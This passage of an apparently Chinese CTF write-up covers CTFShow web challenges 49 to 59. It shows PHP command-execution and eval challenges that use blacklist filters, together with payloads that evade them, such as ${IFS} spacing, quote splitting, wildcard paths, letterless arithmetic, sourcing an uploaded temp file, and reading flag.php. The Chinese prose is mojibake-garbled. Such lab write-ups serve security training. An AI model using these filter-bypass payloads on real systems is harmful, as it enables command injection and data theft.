<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web49.png"></p>
<h2 id="web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>\x09:åå…­è¿›åˆ¶09, \x26:åå…­è¿›åˆ¶26</strong> å³è¿‡æ»¤äº† <strong>%09:tab, %26:&amp;</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web50.png"></p>
<h2 id="web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>tac</strong> (ç»ˆäºè¿‡æ»¤äº†tac) ,ä½†ä»»æœªè¿‡æ»¤ <strong>nl</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=t<span class="string">&#x27;&#x27;</span>ac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=t<span class="string">&#x27;&#x27;</span>ac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web51.png"></p>
<h2 id="web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤šè¿‡æ»¤äº† <strong>&lt; &gt;</strong> ä¸”è§£é™¤äº†å¯¹ <strong>$</strong> çš„è¿‡æ»¤:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c<span class="variable">$IFS</span><span class="string">&#x27;&#x27;</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52.png"></p>
<p>å‘ç° $flag=â€flag_hereâ€ å¹¶ä¸æ˜¯çœŸæ­£flag; TMD</p>
<p>æ‰«æç›®å½•: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_1.png"></p>
<p>å‘ç°å½“å‰ç›®å½•æ²¡åµç”¨ï¼›å†æ‰«ææ ¹ç›®å½•è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_2.png"></p>
<p>æ­¤æ—¶å‘ç°æ ¹ç›®å½•å‡ºç° <strong>flag</strong>,so:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;/fl<span class="string">&#x27;&#x27;</span>ag%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_3.png"></p>
<h2 id="web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>wget</strong> ; ä¸”æ²¡æœ‰äº†â€œé»‘æ´â€: &gt;/dev/null 2&gt;&amp;1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;fl<span class="string">&#x27;&#x27;</span>ag.php</span><br><span class="line">?c=nl$&#123;IFS&#125;fl<span class="string">&#x27;&#x27;</span>ag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web53.png"></p>
<h2 id="web54â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web54â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web54â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web54â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™è¿‡æ»¤çš„â€¦â€¦</p>
<p><strong>æ–¹æ³•ä¸€:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.php = 8ä½, f???????</span></span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>

<p>binä¸ºbinary:ä¸»è¦æ˜¯ç³»ç»Ÿçš„: cat, cp, chmod, dmesg, gzip, kill, ls, mkdir, more, mount, rm, su, tar, ç­‰ç­‰</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54.png"></p>
<p><strong>æ–¹æ³•äºŒ:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨ mv å‘½ä»¤å°† flag.php é‡å‘½åä½ a.txt</span></span><br><span class="line">?C=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line">?c=ls</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ç›®å½•ä¸‹å†…å®¹æ˜¯å¦å°† flag.php æ›´åä½ a.txt</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54_1.png"></p>
<p>æŸ¥çœ‹ a.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//349624a8-72d7-****-****-4024d09777f4.challenge.ctf.show:8080/a.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54_2.png"></p>
<h2 id="web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"><a href="#web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—" class="headerlink" title="web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"></a>web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿‡æ»¤äº† : åˆ†å·ï¼Œå­—æ¯a-z, åå¼•å·, %, 09, 26, &lt;&gt; æ—¢ç„¶è¿‡æ»¤äº† å­—æ¯é‚£ä¹ˆ flagå°†ä¸èƒ½ä½¿ç”¨,ç»è¿‡ç™¾åº¦ä¸€é:</p>
<p>éœ€è¦ç¼–å†™ä¸€ä¸ª ç®€å•çš„ä¸Šä¼ é¡µé¢:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;TargetURL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°† â€œTargetURLâ€ æ›¿æ¢ä¸ºé¢˜ç›®ç¯å¢ƒçš„ URL ä¸Šä¼ ä¸€ä¸ª 1.txt æ–‡ä»¶å…¶å†…å®¹ä¸ºï¼š a</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55.png"></p>
<p>ä½¿ç”¨ bp æŠ“åŒ…:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=.%<span class="number">20</span>/???/????????[@-[]</span><br><span class="line"><span class="comment">// /tmp/flag.php</span></span><br><span class="line"><span class="comment">// [@-[] ä» @ åˆ° [ ï¼š @ï¼Œ26ä¸ªå¤§å†™å­—æ¯, [ , æ‰€ä»¥è¡¨ç¤º åŒ¹é…å¤§å†™å­—æ¯</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55_1.png"></p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55_2.png"></p>
<h2 id="web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"><a href="#web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—" class="headerlink" title="web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"></a>web56â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ï¼ˆweb55ï¼‰å¤š è¿‡æ»¤äº† $, (, { , &#39;, &#39;â€˜, </p>
<p>å…·ä½“æ–¹æ³•ä¸ä¸Šä¸€é¢˜ï¼ˆweb55ï¼‰ ä¸€æ ·ã€‚</p>
<h2 id="web57â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web57â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web57â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web57â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>emmmm</p>
<h2 id="web58â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web58â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web58â€”â€”æ–‡ä»¶åŒ…å«"></a>web58â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç ï¼›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=readfile(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=var_dump(file(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line">c=print_r(file(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line">c=<span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web58.png"></p>
<h2 id="web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web59â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p><strong>åŒ web58</strong></p>
